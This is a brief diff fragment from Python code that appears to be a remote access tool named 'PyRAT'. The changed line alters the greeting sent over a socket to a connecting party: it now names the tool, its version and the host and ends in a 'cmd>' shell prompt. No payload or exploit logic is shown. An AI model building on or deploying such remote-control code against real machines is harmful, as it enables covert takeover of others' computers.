@@ -26,7 +26,7 @@ def create_conn(host,port,ver):
         s.settimeout(None)
         hostname = socket.gethostname()
         #ip = socket.gethostname(socket.gethostname())
-        m1 = "Connection Estabilished!\nP\nHost: {}\nSay Hi!\n\ncmd> ".format(hostname)
+        m1 = "Connection Estabilished!\nPyRAT {}\nHost: {}\nSay Hi!\n\ncmd> ".format(ver,hostname)
         s.send(m1.encode())
         _help = """
 Help Menu:
